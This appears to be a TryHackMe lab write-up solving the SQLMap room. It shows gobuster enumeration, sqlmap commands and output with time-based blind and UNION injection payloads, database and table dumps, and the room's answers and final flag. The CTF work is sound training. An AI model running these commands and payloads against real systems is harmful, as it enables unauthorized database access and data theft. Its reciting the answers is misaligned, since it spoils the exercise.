# [SQLMAP](https://tryhackme.com/room/sqlmap)

## III. SQLMap Challenge

access to target: `http://ip` => `Welcome to nginx!`

### 1. What is the name of the interesting directory ?

answer: `blood`

enumeration:

```bash
┌──(kali㉿kali)-[~/Desktop/openvpn]
└─$ gobuster dir -u http://10.10.32.113/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.32.113/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/09 03:53:56 Starting gobuster in directory enumeration mode
===============================================================
/blood                (Status: 301) [Size: 194] [--> http://10.10.32.113/blood/]

```

### 2. Who is the current db user?

answer: `root`

found interesting request:

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.32.113
Cookie: PHPSESSID=jlfoijitgbiirhvd7uaimihuf0

blood_group=a
```

sqlmap:

```bash
──(kali㉿kali)-[/usr/share/wordlists]                                                                               
└─$ sqlmap -r ~/Desktop/test-sqlmap -batch                                                                            
        ___          
       __H__                                     
 ___ ___[)]_____ ___ ___  {1.7#stable}                                                                                                                                                                                                     
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|                   
      |_|V...       |_|   https://sqlmap.org
                                                                                                            
[04:45:40] [INFO] testing connection to the target URL
[04:45:42] [WARNING] heuristic (basic) test shows that POST parameter 'blood_group' might not be injectable
[04:46:06] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:46:14] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=A+' AND (SELECT 8761 FROM (SELECT(SLEEP(5)))yTfY) AND 'ljxr'='ljxr

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,CONCAT(0x7176626a71,0x6f504e4e6d754776725575454743645579417043544f66636e796e666d554f6d4271624662507951,0x71626b7a71),NULL,NULL,NULL,NULL,NULL-- -
---
[04:46:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ~/Desktop/test-sqlmap -batch  -p 'blood_group' --current-user --dbms=MYSQL

current user: 'root@localhost'

```

### 3. What is the final flag?

flag: `thm{sqlm@p_is_L0ve}`

```bash
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sqlmap -r ~/Desktop/test-sqlmap -batch -p 'blood-group' --dbms=MYSQL -dbs

[05:03:47] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test

```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ~/Desktop/test-sqlmap -batch  -p 'blood_group' --dbms=MYSQL -D blood --tables

[05:10:08] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r ~/Desktop/test-sqlmap -batch  -p 'blood_group' --dbms=MYSQL -D blood -T flag -dump

Table: flag
[1 entry]
+----+---------------------+------+
| id | flag                | name |
+----+---------------------+------+
| 1  | thm{sqlm@p_is_L0ve} | flag |
+----+---------------------+------+
```
